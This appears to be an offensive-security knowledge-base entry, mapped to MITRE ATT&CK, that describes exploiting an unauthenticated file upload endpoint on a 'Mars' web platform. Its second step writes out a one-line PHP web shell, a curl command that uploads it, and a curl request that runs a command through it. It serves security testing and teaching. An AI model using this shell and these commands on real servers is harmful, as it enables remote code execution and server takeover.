---
id: ac-unrestricted-file-upload-mars
tags:
  - unrestricted-upload
  - file-upload
  - rce
  - web-vulnerability
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Unrestricted-File-Upload]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T05:32:13.629Z'
description: >-
  An attack chain exploiting an unrestricted file upload vulnerability allowing
  anonymous users to upload malicious files, potentially leading to remote code
  execution and server compromise on a web platform.
skill_level: beginner
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
---
# Anonymous Unrestricted File Upload Leading to Server Compromise

Multi-stage attack chain demonstrating exploitation of an unrestricted file upload endpoint on the Mars platform, allowing anonymous users to upload malicious files without authentication or validation. This can lead to remote code execution, data breaches, or service disruption, with a severity rating of 9.3.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Reconnaissance: Identify Upload Endpoint] --> B[Execution: Upload Malicious File]
    B --> C[Impact: Server Compromise]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP client like curl)

### Target Environment

- Web platform (e.g., Mars application)
- Exposed upload endpoint without authentication
- Network access to the public endpoint

### Initial Access Requirements

- No credentials required (anonymous access)
- Direct internet access to the target URL
- No prior access needed

## Detailed Attack Procedures

### Step 1: Reconnaissance - Identify Upload Endpoint

procedure: [[procedures/Exploit-Unrestricted-File-Upload]]

**Objective**: Discover the unrestricted file upload endpoint through reconnaissance of public interfaces.

**Instructions**: During security testing, scan or manually explore the web application for upload functionality. Use browser developer tools or automated scanners to identify endpoints like /upload without authentication checks.

**Expected Output**: Confirmation of the endpoint URL (e.g., https://mars.example.com/upload) that accepts files without validation.

**Success Indicators**:
- Endpoint responds to GET/POST without auth prompts
- No file type or size restrictions observed

### Step 2: Execution - Upload Malicious File

procedure: [[procedures/Exploit-Unrestricted-File-Upload]]

**Objective**: Upload a malicious file (e.g., web shell) to the server, enabling remote code execution.

**Instructions**: Prepare a malicious PHP web shell file (e.g., shell.php with <?php system($_GET['cmd']); ?>) and upload it using [[commands/curl-file-upload]]:

```bash
curl -X POST -F "file=@shell.php" https://mars.example.com/upload
```

Verify upload by accessing the uploaded file via its predicted path (e.g., /uploads/shell.php) and executing a command:

```bash
curl "https://mars.example.com/uploads/shell.php?cmd=whoami"
```

**Expected Output**: Server processes the upload without errors, and the web shell responds with command output (e.g., web server user).

**Success Indicators**:
- File uploaded successfully (HTTP 200 response)
- Malicious file accessible and executable on the server
- Command execution confirms RCE

## Attack Chain Summary

### Key Achievements

1. Identified anonymous upload endpoint without validation
2. Uploaded malicious web shell for RCE
3. Demonstrated potential for server compromise and data exfiltration

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Remote File Copy]] Ingress Tool Transfer

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

---
*Last updated: 2023-10-01T00:00:00Z*
